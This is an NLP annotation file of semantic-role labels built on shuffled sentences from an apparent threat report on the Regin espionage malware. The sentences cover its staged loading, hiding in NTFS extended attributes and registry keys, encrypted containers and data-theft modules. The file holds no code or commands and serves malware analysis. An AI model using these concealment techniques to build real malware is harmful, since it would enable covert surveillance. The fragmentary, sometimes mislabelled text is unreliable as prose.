PHPSESSID, or phpAds_d": {"can": {"V": {"text": "can", "index": 5}}, "be": {"V": {"text": "be", "index": 6}}, "encoded": {"ARG1": {"text": "Payload information"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "encoded", "index": 7}, "ARGM-LOC": {"text": "within cookie data/ under the names SESSID , SMSWAP , TW , WINKER , TIMESET , LASTVISIT ,"}, "ARGM-ADV": {"text": "AST.NET_SessionId , PHPSESSID , or phpAds_d"}}, "embedded": {"ARG1": {"text": "Payload information"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "embedded", "index": 9}, "ARG2": {"text": "within cookie data under the names SESSID , SMSWAP , TW , WINKER , TIMESET , LASTVISIT"}}}, "\n                           \u2022\t   Partial: Log type, last log, older log timestamps\n                           \u2022\t   Complete: Entire log data is exfiltrated\n\n</table>\n    The IIS web server log stealing module, 27E9h, is an example of a payload module that was installed after the initial\n    infection and was specifically deployed for a particular target": {"is": {"ARG1": {"text": "Entire log data"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "exfiltrated The IIS web server log stealing module , 27E9h"}}, "exfiltrated": {"ARG0": {"text": "Entire log data"}, "V": {"text": "exfiltrated", "index": 19}, "ARG1": {"text": "The IIS web server log stealing module , 27E9h"}}, "log": {"ARG0": {"text": "IIS web server"}, "V": {"text": "log", "index": 24}, "ARG1": {"text": "stealing module"}}, "stealing": {"ARG0": {"text": "IIS web server log"}, "V": {"text": "stealing", "index": 25}, "ARG1": {"text": "module"}}, "is_2": {"V": {"text": "is", "index": 30}, "ARG2": {"text": "an example of a payload module that was installed after the initial infection and was specifically deployed for a particular target"}}, "was": {"V": {"text": "was", "index": 38}}, "installed": {"ARG1": {"text": "a payload module"}, "R-ARG1": {"text": "that"}, "V": {"text": "installed", "index": 39}, "ARGM-TMP": {"text": "after the initial infection"}}, "was_2": {"V": {"text": "was", "index": 45}}, "deployed": {"ARG1": {"text": "a payload module"}, "R-ARG1": {"text": "that"}, "ARGM-ADV": {"text": "specifically"}, "V": {"text": "deployed", "index": 47}, "ARGM-PRP": {"text": "for a particular target"}}}, " Rather than loading Stage 2 from an NTFS extended attribute, Stage 1 looks for the last partition (in terms of\n\n\n\n\n                                              <footer>         Page 15</footer>\n\f                                           <header>    Regin: Top-tier espionage tool enables stealthy surveillance</header>\n\n\n\n\n    physical location) on disk and searches for the payload in the raw sectors in this area of the disk": {"loading": {"V": {"text": "loading", "index": 2}, "ARG1": {"text": "Stage 2"}, "ARG2": {"text": "from an NTFS extended attribute"}}, "extended": {"ARG1": {"text": "an NTFS"}, "V": {"text": "extended", "index": 8}, "ARG2": {"text": "attribute"}}, "looks": {"ARGM-ADJ": {"text": "Stage"}, "ARGM-MNR": {"text": "1"}, "V": {"text": "looks", "index": 13}, "ARG1": {"text": "for the last partition ( in terms of physical location ) on disk and searches for the payload in the raw sectors in this area of the disk"}}}, " Instead, Stage 1 is a user mode DLL loaded as a Winsock helper when the computer is starting\n    up": {"is": {"ARGM-DIS": {"text": "Instead"}, "ARG1": {"text": "Stage 1"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "a user mode DLL loaded as a Winsock helper when the computer is starting up"}}, "loaded": {"ARG2": {"text": "a user mode DLL"}, "V": {"text": "loaded", "index": 9}, "ARG1": {"text": "as a Winsock helper"}, "ARGM-TMP": {"text": "when the computer is starting up"}}, "is_2": {"V": {"text": "is", "index": 17}}, "starting": {"ARGM-TMP": {"text": "when"}, "ARG1": {"text": "the computer"}, "V": {"text": "starting", "index": 18}}}, " Instead, this file is encrypted within\n  an extended attribute or registry key blob": {"is": {"ARGM-DIS": {"text": "Instead"}, "ARG1": {"text": "this file"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "encrypted within an extended attribute or registry key blob"}}, "encrypted": {"ARGM-DIS": {"text": "Instead"}, "ARG1": {"text": "this file"}, "V": {"text": "encrypted", "index": 5}, "ARGM-LOC": {"text": "within an extended attribute or registry key blob"}}, "extended": {"V": {"text": "extended", "index": 8}, "ARG1": {"text": "attribute"}}}, "\n\n  The main purpose of Regin is intelligence gathering and it has been implicated in data\n  collection operations against government organizations, infrastructure operators,\n  businesses, academics, and private individuals": {"is": {"ARG1": {"text": "The main purpose of Regin"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "intelligence gathering"}}, "has": {"V": {"text": "has", "index": 10}}, "been": {"ARG1": {"text": "it"}, "V": {"text": "been", "index": 11}, "ARG2": {"text": "implicated in data collection operations against government organizations , infrastructure operators , businesses , academics , and private individuals"}}, "implicated": {"ARG1": {"text": "it"}, "V": {"text": "implicated", "index": 12}, "ARG2": {"text": "in data collection operations against government organizations , infrastructure operators , businesses , academics , and private individuals"}}}, " Furthermore, compromised\n  computers can serve as a proxy for other\n  infections and command and control can\n  also happen in a peer-to-peer fashion": {"compromised": {"V": {"text": "compromised", "index": 2}, "ARG1": {"text": "computers"}}, "can": {"V": {"text": "can", "index": 4}}, "serve": {"ARG0": {"text": "compromised computers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "serve", "index": 5}, "ARG1": {"text": "as a proxy for other infections"}}, "can_2": {"V": {"text": "can", "index": 16}}, "happen": {"ARG1": {"text": "command and control"}, "ARGM-MOD": {"text": "can"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "happen", "index": 18}, "ARGM-MNR": {"text": "in a peer - to - peer fashion"}}}, " This stage drops the file msrdc64.dat, which appears to always\n  be 512 bytes in size": {"drops": {"ARG0": {"text": "This stage"}, "V": {"text": "drops", "index": 2}, "ARG1": {"text": "the file msrdc64.dat , which appears to always be 512 bytes in size"}}, "appears": {"ARG1": {"text": "the file msrdc64.dat"}, "C-ARG1": {"text": "which/ to always be 512 bytes in size"}, "V": {"text": "appears", "index": 8}}, "be": {"ARG1": {"text": "msrdc64.dat/ which"}, "ARGM-TMP": {"text": "always/ in"}, "V": {"text": "be", "index": 11}, "ARG2": {"text": "512 bytes"}}}, "\n\n  Stage 2 can be found encrypted in:\n<list>\n  Extended attribute\n  \u2022\t %Windir%\n  \u2022\t %Windir%\\fonts\n  \u2022\t %Windir%\\cursors (possibly only in version 2.0)\n  Registry subkey\n  \u2022\t HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4F20E605-9452-4787-B793-\n     D0204917CA58}\n  \u2022\t HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\RestoreList\\VideoBase (possibly only in version\n     2.0)\n</list>\n  This stage can also hide running instances of Stage 1": {"can": {"V": {"text": "can", "index": 2}}, "be": {"V": {"text": "be", "index": 3}}, "found": {"ARGM-MOD": {"text": "can"}, "V": {"text": "found", "index": 4}, "ARGM-PRD": {"text": "encrypted in"}}, "encrypted": {"ARG1": {"text": "Stage 2"}, "V": {"text": "encrypted", "index": 5}}, "can_2": {"V": {"text": "can", "index": 10}}, "hide": {"ARG0": {"text": "This stage"}, "ARGM-MOD": {"text": "can"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "hide", "index": 12}, "ARG1": {"text": "running instances of Stage 1"}}, "running": {"V": {"text": "running", "index": 13}, "ARG1": {"text": "instances of"}}}, " Example payload\n  functionality seen to date includes:\n<list>\n  \u2022\t Sniffing low-level network traffic\n  \u2022\t Exfiltrating data through various channels (TCP, UDP, ICMP, HTTP)\n  \u2022\t Gathering computer information\n  \u2022\t Stealing passwords\n  \u2022\t Gathering process and memory information\n  \u2022\t Crawling through the file system\n  \u2022\t Low level forensics capabilities (for example, retrieving files that were deleted)\n  \u2022\t UI manipulation (remote mouse point & click activities, capturing screenshots, etc.)\n  \u2022\t Enumerating IIS web servers and stealing logs\n  \u2022\t Sniffing GSM BSC administration network traffic\n</list>\n</section>\n<section>\n<heading>Encrypted virtual file system containers</heading>\n  Regin stores data files and payloads on disk in encrypted virtual file system files": {"seen": {"ARG1": {"text": "Example payload functionality"}, "V": {"text": "seen", "index": 3}, "C-ARG1": {"text": "to date"}}, "includes": {"ARG2": {"text": "Example payload functionality seen to date"}, "V": {"text": "includes", "index": 6}, "ARG1": {"text": "Regin stores data files and payloads on"}, "C-ARG1": {"text": "disk in encrypted virtual file system files"}}, "encrypted": {"V": {"text": "encrypted", "index": 17}, "ARG1": {"text": "virtual file system files"}}}, " It is built\n  on a framework that is designed to sustain long-term intelligence-gathering operations\n  by remaining under the radar": {"is": {"V": {"text": "is", "index": 1}}, "built": {"ARG1": {"text": "It"}, "V": {"text": "built", "index": 2}, "ARG2": {"text": "on a framework that is designed to sustain long - term intelligence - gathering operations by remaining under the radar"}}, "is_2": {"V": {"text": "is", "index": 7}}, "designed": {"ARG1": {"text": "a framework"}, "R-ARG1": {"text": "that"}, "V": {"text": "designed", "index": 8}, "ARG3": {"text": "to sustain long - term intelligence - gathering operations by remaining under the radar"}}, "sustain": {"ARG0": {"text": "that"}, "V": {"text": "sustain", "index": 10}, "ARG1": {"text": "long - term intelligence - gathering operations"}, "ARGM-MNR": {"text": "by remaining under the radar"}}, "gathering": {"V": {"text": "gathering", "index": 16}, "ARG0": {"text": "operations"}}, "remaining": {"ARG1": {"text": "that"}, "V": {"text": "remaining", "index": 19}, "ARGM-LOC": {"text": "under the radar"}}}, " The files for Stage 5 are injected into services.exe by\n  Stage 4": {"are": {"V": {"text": "are", "index": 5}}, "injected": {"ARG1": {"text": "The files for Stage 5"}, "V": {"text": "injected", "index": 6}, "ARG2": {"text": "into services.exe/ by Stage 4"}}}, " It can\n    also scan for deleted files on an infected computer and retrieve them": {"can": {"ARG0": {"text": "It"}, "V": {"text": "can", "index": 1}, "ARGM-ADV": {"text": "also"}, "ARG1": {"text": "scan for deleted files on an infected computer"}}, "scan": {"ARG0": {"text": "It"}, "ARGM-MOD": {"text": "can"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "scan", "index": 3}, "ARG2": {"text": "for deleted files"}, "ARG1": {"text": "on an infected computer"}}, "deleted": {"V": {"text": "deleted", "index": 5}, "ARG1": {"text": "files"}}, "retrieve": {"ARG0": {"text": "It"}, "ARGM-MOD": {"text": "can"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "retrieve", "index": 12}, "ARG1": {"text": "them"}}}, " These\n  backchannel operations are bidirectional,\n  which means either the attackers can initiate\n  communications with compromised computers\n  on the border network or the compromised\n  computers can initiate communications with\n  the attacker": {"are": {"ARG1": {"text": "These backchannel operations"}, "V": {"text": "are", "index": 3}, "ARG2": {"text": "bidirectional ,/ can initiate communications with compromised computers/ computers can initiate communications with the attacker"}, "ARGM-ADV": {"text": "which means either the attackers"}}, "means": {"ARG0": {"text": "bidirectional"}, "R-ARG0": {"text": "which"}, "V": {"text": "means", "index": 7}, "ARG1": {"text": "either the attackers can initiate communications with compromised computers on the border network or the compromised computers can initiate communications with the attacker"}}, "can": {"ARG0": {"text": "either the attackers"}, "V": {"text": "can", "index": 11}, "ARG1": {"text": "initiate communications"}, "ARG2": {"text": "with compromised computers on"}}, "initiate": {"ARG0": {"text": "either the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "initiate", "index": 12}, "ARG1": {"text": "communications"}}, "compromised": {"V": {"text": "compromised", "index": 15}, "ARG1": {"text": "computers"}}, "compromised_2": {"V": {"text": "compromised", "index": 23}, "ARG1": {"text": "computers"}}, "can_2": {"ARG0": {"text": "either the attackers/ initiate communications with compromised computers on the border network or the compromised computers"}, "V": {"text": "can", "index": 25}, "ARG1": {"text": "initiate communications"}, "ARGM-MNR": {"text": "with the attacker"}}, "initiate_2": {"ARG0": {"text": "initiate communications/ computers on the border network or the compromised computers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "initiate", "index": 26}, "ARG1": {"text": "communications"}, "ARGM-MNR": {"text": "with the attacker"}}}, "\n\n    Regin goes to some lengths to hide the data it is stealing": {"goes": {"ARG0": {"text": "Regin"}, "V": {"text": "goes", "index": 1}, "ARG1": {"text": "to some lengths"}, "ARGM-PRP": {"text": "to hide the data it is stealing"}}, "hide": {"ARG0": {"text": "Regin"}, "V": {"text": "hide", "index": 6}, "ARG1": {"text": "the data it is stealing"}}, "is": {"ARG1": {"text": "it"}, "V": {"text": "is", "index": 10}, "ARG2": {"text": "stealing"}}, "stealing": {"ARG1": {"text": "the data"}, "ARG0": {"text": "it"}, "V": {"text": "stealing", "index": 11}}}, " This file is not an encrypted container, but it is encrypted and\n  compressed": {"is": {"ARG1": {"text": "This file"}, "V": {"text": "is", "index": 2}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "an encrypted container"}}, "encrypted": {"V": {"text": "encrypted", "index": 5}, "ARG1": {"text": "container"}}, "is_2": {"ARG1": {"text": "it"}, "V": {"text": "is", "index": 10}, "ARG2": {"text": "encrypted and compressed"}}, "encrypted_2": {"ARG1": {"text": "it"}, "V": {"text": "encrypted", "index": 11}}, "compressed": {"ARG1": {"text": "it"}, "V": {"text": "compressed", "index": 13}}}, " These kernel drivers may be registered as a system\n  service or may have an associated registry key to load the driver while the computer is starting up": {"may": {"V": {"text": "may", "index": 3}}, "be": {"V": {"text": "be", "index": 4}}, "registered": {"ARG1": {"text": "These kernel drivers"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "registered", "index": 5}, "ARG3": {"text": "as a system service"}}, "may_2": {"V": {"text": "may", "index": 11}}, "have": {"ARG0": {"text": "These kernel drivers"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "have", "index": 12}, "ARG1": {"text": "an associated registry key to load the driver"}, "ARGM-TMP": {"text": "while the computer is starting up"}}, "associated": {"V": {"text": "associated", "index": 14}, "ARG1": {"text": "registry"}}, "load": {"V": {"text": "load", "index": 18}, "ARG2": {"text": "the driver"}}, "is": {"V": {"text": "is", "index": 24}}, "starting": {"ARG1": {"text": "the computer"}, "V": {"text": "starting", "index": 25}}}, " Regin is also configured to\n    steal passwords, monitor network traffic, and gather information on processes and memory utilization": {"is": {"ARG1": {"text": "Regin"}, "V": {"text": "is", "index": 1}, "ARGM-DIS": {"text": "also"}, "ARG2": {"text": "configured to steal passwords , monitor network traffic , and gather information on processes and memory utilization"}}, "configured": {"ARG1": {"text": "Regin"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "configured", "index": 3}, "ARG4": {"text": "to steal passwords , monitor network traffic , and gather information"}}, "steal": {"ARG0": {"text": "Regin"}, "V": {"text": "steal", "index": 5}, "ARG1": {"text": "passwords , monitor network traffic ,"}}, "monitor": {"ARG0": {"text": "Regin"}, "V": {"text": "monitor", "index": 8}, "ARG1": {"text": "network traffic"}}, "gather": {"ARG0": {"text": "Regin"}, "V": {"text": "gather", "index": 13}, "ARG1": {"text": "information on processes and memory utilization"}}}, " Similar to previous stages, Stage 2 finds and loads an encrypted version of Stage 3 from either\n  NTFS extended attributes or a registry key blob": {"finds": {"ARGM-PRD": {"text": "Similar to previous stages"}, "ARG0": {"text": "Stage 2"}, "V": {"text": "finds", "index": 7}, "ARG1": {"text": "an encrypted version of Stage 3 from either NTFS extended attributes or a registry key blob"}}, "loads": {"R-ARG0": {"text": "Similar to previous stages"}, "ARG0": {"text": "Stage 2"}, "V": {"text": "loads", "index": 9}, "ARG1": {"text": "an encrypted version of Stage 3"}, "ARG2": {"text": "from either NTFS extended attributes or a registry key blob"}}, "encrypted": {"V": {"text": "encrypted", "index": 11}, "ARG1": {"text": "version"}}}, "\n\n</section>\n<section>\n<heading>Conclusion</heading>\n    Regin is a highly-complex threat which has been used for large-scale data collection or intelligence gathering\n    campaigns": {"is": {"ARG1": {"text": "Regin"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a highly - complex threat which has been used for large - scale data collection or intelligence gathering campaigns"}}, "has": {"V": {"text": "has", "index": 8}}, "been": {"V": {"text": "been", "index": 9}}, "used": {"ARG1": {"text": "a highly - complex threat"}, "R-ARG1": {"text": "which"}, "V": {"text": "used", "index": 10}, "ARG2": {"text": "for large - scale data collection or intelligence gathering campaigns"}}}, "\n\n  As explained above, the files are encrypted": {"explained": {"V": {"text": "explained", "index": 1}, "ARGM-LOC": {"text": "above"}}, "are": {"V": {"text": "are", "index": 6}}, "encrypted": {"ARGM-ADV": {"text": "As explained above"}, "ARG1": {"text": "the files"}, "V": {"text": "encrypted", "index": 7}}}, " Stage 2 is not stored in the traditional\n  file system, but is encrypted within an extended attribute or a registry key blob": {"is": {"V": {"text": "is", "index": 2}}, "stored": {"ARG1": {"text": "Stage 2"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "stored", "index": 4}, "ARGM-LOC": {"text": "in the traditional file system"}}, "is_2": {"ARG1": {"text": "Stage 2"}, "V": {"text": "is", "index": 12}, "ARG2": {"text": "encrypted within an extended attribute or a registry key blob"}}, "encrypted": {"ARG1": {"text": "Stage 2"}, "V": {"text": "encrypted", "index": 13}, "ARGM-ADV": {"text": "within an extended attribute or a registry key blob"}}, "extended": {"V": {"text": "extended", "index": 16}, "ARG1": {"text": "attribute"}}}, " The container\u2019s sectors</caption>\n<table>\nOffset      Type                   Description\n00h         DWORD                  Next sector offset, or 0\n04h         BYTE[sectsize-4]       Data\n</table>\n</section>\n<section>\n<heading>Logging</heading>\n  Regin logs data to the ApplicationLog.dat file": {"logs": {"ARG0": {"text": "The container \u2019s sectors Regin"}, "V": {"text": "logs", "index": 5}, "ARG1": {"text": "data"}, "ARG2": {"text": "to the ApplicationLog.dat file"}}}, " Valuable target data is often not written to disk": {"is": {"V": {"text": "is", "index": 3}}, "written": {"ARG1": {"text": "Valuable target data"}, "ARGM-TMP": {"text": "often"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "written", "index": 6}, "ARG2": {"text": "to disk"}}, "disk": {"ARG1": {"text": "Valuable target data"}, "V": {"text": "disk", "index": 8}}}, "\n</cover>\n\f                                                     <header>   Regin: Top-tier espionage tool enables stealthy surveillance</header>\n\n\n\n<section>\n<heading>Payloads</heading>\n    Regin can be distributed with various payload modules or receive payload modules after infection": {"can": {"V": {"text": "can", "index": 1}}, "be": {"V": {"text": "be", "index": 2}}, "distributed": {"ARG1": {"text": "Regin"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "distributed", "index": 3}, "ARGM-MNR": {"text": "with various payload modules or receive payload modules"}}, "receive": {"ARG0": {"text": "Regin"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "receive", "index": 9}, "ARG1": {"text": "payload modules"}, "ARGM-TMP": {"text": "after infection"}}}, "\n</section>\n<section>\n<heading>Stage 1</heading>\n  Stage 1 is the initial load point for the threat": {"is": {"ARG1": {"text": "Stage 1"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "the initial load point for the threat"}}}, " There are two known Stage 1 file names:\n  <list>\n  \u2022\t usbclass.sys (version 1.0)\n  \u2022\t adpu160.sys (version 2.0)\n  </list>\n  These are kernel drivers that load and execute Stage 2": {"are": {"V": {"text": "are", "index": 1}, "ARG1": {"text": "two known Stage 1 file names"}}, "are_2": {"ARG1": {"text": "These"}, "V": {"text": "are", "index": 10}, "ARG2": {"text": "kernel drivers"}, "C-ARG1": {"text": "that load and execute Stage 2"}}, "load": {"ARG0": {"text": "kernel drivers"}, "R-ARG0": {"text": "that"}, "V": {"text": "load", "index": 14}}, "execute": {"ARG0": {"text": "kernel drivers"}, "R-ARG0": {"text": "that"}, "V": {"text": "execute", "index": 16}, "ARG2": {"text": "Stage 2"}}}, " If no extended attributes are\n  found, Stage 2 is executed from a set of registry keys": {"are": {"V": {"text": "are", "index": 4}}, "found": {"ARG1": {"text": "no extended attributes"}, "V": {"text": "found", "index": 5}}, "is": {"V": {"text": "is", "index": 9}}, "executed": {"ARGM-ADV": {"text": "If no extended attributes are found"}, "ARG1": {"text": "Stage 2"}, "V": {"text": "executed", "index": 10}, "ARG0": {"text": "from a set of registry keys"}}}, " The encryption\n  mode is reverse cipher feedback (CFB)": {"is": {"V": {"text": "is", "index": 3}}}, " It is used for the\n  collection of data and continuous monitoring of targeted organizations or individuals": {"is": {"V": {"text": "is", "index": 1}}, "used": {"ARG1": {"text": "It"}, "V": {"text": "used", "index": 2}, "ARG2": {"text": "for the collection of data and continuous monitoring of targeted organizations or individuals"}}, "targeted": {"V": {"text": "targeted", "index": 12}, "ARG1": {"text": "organizations or individuals"}}}, "\n\n    Regin has a wide range of standard capabilities, particularly around monitoring targets and stealing data": {"has": {"ARG0": {"text": "Regin"}, "V": {"text": "has", "index": 1}, "ARG1": {"text": "a wide range of standard capabilities"}, "ARGM-ADV": {"text": "particularly around monitoring targets and stealing data"}}, "monitoring": {"V": {"text": "monitoring", "index": 11}, "ARG1": {"text": "targets and stealing data"}}, "stealing": {"V": {"text": "stealing", "index": 14}, "ARG1": {"text": "data"}}}, "\n\n  Stage 2 can also monitor the state of the threat": {"can": {"V": {"text": "can", "index": 2}}, "monitor": {"ARG0": {"text": "Stage 2"}, "ARGM-MOD": {"text": "can"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "monitor", "index": 4}, "ARG1": {"text": "the state of the threat"}}}, " We also recovered files from infected\n    computers that may or may not be associated with 64-bit Regin, including several variants of svcsstat.exe, a file that\n    aims to retrieve binary data over pipes or sockets and execute the data": {"recovered": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "recovered", "index": 2}, "ARG1": {"text": "files"}, "ARG2": {"text": "from infected computers that may or may not be associated with 64-bit Regin , including several variants of svcsstat.exe"}, "C-ARG1": {"text": "a file that aims to retrieve binary data over pipes or sockets and execute the data"}}, "may": {"ARG0": {"text": "infected computers"}, "R-ARG0": {"text": "that"}, "V": {"text": "may", "index": 8}, "ARG1": {"text": "64-bit Regin"}}, "may_2": {"V": {"text": "may", "index": 10}}, "be": {"V": {"text": "be", "index": 12}}, "associated": {"ARG1": {"text": "infected computers"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "may/ may"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "associated", "index": 13}, "ARG2": {"text": "with 64-bit Regin"}}, "including": {"ARG2": {"text": "64-bit Regin"}, "V": {"text": "including", "index": 18}, "ARG1": {"text": "several variants of svcsstat.exe"}}, "aims": {"ARG0": {"text": "a file"}, "R-ARG0": {"text": "that"}, "V": {"text": "aims", "index": 27}, "ARG1": {"text": "to retrieve binary data over pipes or sockets and execute the data"}}, "retrieve": {"ARG0": {"text": "a file/ that"}, "V": {"text": "retrieve", "index": 29}, "ARG1": {"text": "binary data over pipes or sockets"}}, "execute": {"ARG0": {"text": "that"}, "V": {"text": "execute", "index": 37}, "ARG1": {"text": "the data"}}}, " Symantec believes that\n  once the dropper is executed on the target\u2019s computer, it will install and execute Stage 1": {"believes": {"ARG0": {"text": "Symantec"}, "V": {"text": "believes", "index": 1}, "ARG1": {"text": "that once the dropper is executed on the target \u2019s computer , it will install and execute Stage 1"}}, "is": {"V": {"text": "is", "index": 6}}, "executed": {"ARG1": {"text": "the dropper"}, "V": {"text": "executed", "index": 7}, "ARGM-LOC": {"text": "on the target \u2019s computer"}}, "will": {"ARGM-TMP": {"text": "once the dropper is executed on the target \u2019s computer"}, "ARG0": {"text": "it"}, "V": {"text": "will", "index": 15}, "ARG1": {"text": "install"}}, "install": {"ARGM-TMP": {"text": "once the dropper is executed on the target \u2019s computer"}, "ARG1": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "install", "index": 16}}, "execute": {"ARGM-TMP": {"text": "once the dropper is executed on the target \u2019s computer"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "execute", "index": 18}, "ARG1": {"text": "Stage 1"}}}, " All\n    other stages are stored as encrypted data blobs,\n\n    as a file or within a non-traditional file storage\n\n    area such as the registry, extended attributes, or\n    raw sectors at the end of disk": {"are": {"V": {"text": "are", "index": 3}}, "stored": {"ARG1": {"text": "All other stages"}, "V": {"text": "stored", "index": 4}, "ARGM-PRD": {"text": "as encrypted data blobs , as a file or within a non - traditional file storage area such as the registry , extended attributes , or raw sectors at the end of disk"}}, "encrypted": {"V": {"text": "encrypted", "index": 6}, "ARG1": {"text": "data blobs"}}}, "\n\n    Regin is capable of installing a large number of additional payloads, some highly customized for the targeted\n    computer": {"is": {"ARG1": {"text": "Regin"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "capable of installing a large number of additional payloads , some highly customized for the targeted computer"}}, "installing": {"ARG0": {"text": "Regin"}, "V": {"text": "installing", "index": 4}, "ARG1": {"text": "a large number of additional payloads , some highly customized for the targeted computer"}}, "customized": {"ARGM-EXT": {"text": "highly"}, "V": {"text": "customized", "index": 14}, "ARG1": {"text": "for the targeted computer"}}, "targeted": {"V": {"text": "targeted", "index": 17}, "ARG1": {"text": "computer"}}}, "\n\n  Stage 1 simply reads and executes Stage 2 from a set of NTFS extended attributes": {"reads": {"ARG1": {"text": "Stage 1"}, "ARGM-ADV": {"text": "simply"}, "V": {"text": "reads", "index": 3}, "ARG3": {"text": "from a set of NTFS extended attributes"}}, "executes": {"ARG0": {"text": "Stage 1"}, "ARGM-ADV": {"text": "simply"}, "V": {"text": "executes", "index": 5}, "ARG1": {"text": "Stage 2"}, "ARG2": {"text": "from a set of NTFS extended attributes"}}}, " It goes to extraordinary lengths to conceal itself and its\n  activities on compromised computers": {"goes": {"ARG1": {"text": "It"}, "V": {"text": "goes", "index": 1}, "ARG2": {"text": "to extraordinary lengths"}, "ARGM-PRP": {"text": "to conceal itself and its activities on compromised computers"}}, "conceal": {"V": {"text": "conceal", "index": 6}, "ARG1": {"text": "itself"}}, "compromised": {"V": {"text": "compromised", "index": 12}, "ARG1": {"text": "computers"}}}, " In addition to loading and executing Stage 4, Stage\n3 offers a framework for the higher level stages": {"executing": {"V": {"text": "executing", "index": 5}, "ARG1": {"text": "Stage 4"}}, "offers": {"ARGM-ADV": {"text": "In addition to loading and executing Stage 4"}, "ARG0": {"text": "Stage 3"}, "V": {"text": "offers", "index": 11}, "ARG1": {"text": "a framework for the higher level stages"}}}, " Files stored inside EVFS containers are\n  encrypted with a variant of RC5, using 64-bit blocks and 20 rounds": {"stored": {"ARG1": {"text": "Files"}, "V": {"text": "stored", "index": 1}, "ARGM-LOC": {"text": "inside EVFS containers"}}, "are": {"V": {"text": "are", "index": 5}}, "encrypted": {"ARG1": {"text": "Files stored inside EVFS containers"}, "V": {"text": "encrypted", "index": 6}, "ARGM-MNR": {"text": "with a variant of RC5"}, "ARGM-PRD": {"text": "using 64-bit blocks and 20 rounds"}}, "using": {"V": {"text": "using", "index": 13}, "ARG1": {"text": "64-bit blocks and 20 rounds"}}}, " The modular design also makes analysis of the\n  threat difficult, as all components must be available in order to fully understand it": {"makes": {"ARG0": {"text": "The modular design"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "makes", "index": 4}, "ARG1": {"text": "analysis of the threat difficult"}, "ARGM-CAU": {"text": "as all components must be available in order to fully understand it"}}, "must": {"V": {"text": "must", "index": 14}}, "be": {"ARG1": {"text": "all components"}, "ARGM-MOD": {"text": "must"}, "V": {"text": "be", "index": 15}, "ARG2": {"text": "available"}, "ARGM-PRP": {"text": "in order to fully understand it"}}, "understand": {"ARGM-EXT": {"text": "fully"}, "V": {"text": "understand", "index": 21}, "ARG1": {"text": "it"}}}, " The initial\n    stages involve the installation and configuration\n    of the threat\u2019s internal services": {"involve": {"ARG2": {"text": "The initial stages"}, "V": {"text": "involve", "index": 3}, "ARG1": {"text": "the installation and configuration of the threat \u2019s internal services"}}}, " It\u2019s likely that Stage\n  0 is responsible for setting up various extended attributes and/or registry keys and values that hold encoded\n  versions of stages 2, 3, and potentially stages 4 and onwards": {"\u2019s": {"V": {"text": "\u2019s", "index": 1}, "ARG1": {"text": "likely that Stage 0 is responsible for setting up various extended attributes and/or registry keys and values that hold encoded versions of stages 2 , 3 , and potentially stages 4 and onwards"}}, "is": {"ARG1": {"text": "Stage 0"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "responsible for setting up various extended attributes and/or registry keys and values that hold encoded versions of stages 2 , 3 , and potentially stages 4 and onwards"}}, "setting": {"V": {"text": "setting", "index": 9}, "ARG1": {"text": "various extended attributes and/or registry keys and values that hold encoded versions of stages 2 , 3 , and potentially stages 4 and onwards"}}, "hold": {"ARG0": {"text": "various/ and values"}, "R-ARG0": {"text": "that"}, "V": {"text": "hold", "index": 20}, "ARG1": {"text": "encoded versions of stages 2 , 3 , and potentially stages"}}, "encoded": {"V": {"text": "encoded", "index": 21}, "ARG1": {"text": "versions of stages 2 , 3"}}, "stages": {"ARGM-ADV": {"text": "potentially"}, "V": {"text": "stages", "index": 31}}}, "\n</section>\n<section>\n<heading>Stage 2</heading>\n  Stage 2 is a kernel driver that simply extracts, installs and runs Stage 3": {"is": {"ARG1": {"text": "Stage 2"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a kernel driver that simply extracts , installs and runs Stage 3"}}, "extracts": {"ARG0": {"text": "a kernel driver"}, "R-ARG0": {"text": "that"}, "ARGM-MNR": {"text": "simply"}, "V": {"text": "extracts", "index": 8}}, "runs": {"ARG0": {"text": "a kernel driver"}, "R-ARG0": {"text": "that"}, "ARGM-MNR": {"text": "simply"}, "V": {"text": "runs", "index": 12}, "ARGM-EXT": {"text": "Stage 3"}}}, " APTs typically seek specific\n  information, usually intellectual property": {"seek": {"ARG0": {"text": "APTs"}, "ARGM-TMP": {"text": "typically"}, "V": {"text": "seek", "index": 2}, "ARG1": {"text": "specific information"}, "ARGM-PRD": {"text": "usually intellectual property"}}}, "\n  The C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage\n  5 payloads, such as C375h and 1Bh": {"are": {"V": {"text": "are", "index": 3}}, "undertaken": {"ARG1": {"text": "The C&C operations"}, "V": {"text": "undertaken", "index": 4}, "ARG0": {"text": "by various modules , including major groups C373h , 19h , 9 , as well as Stage 5 payloads , such as C375h and 1Bh"}}, "including": 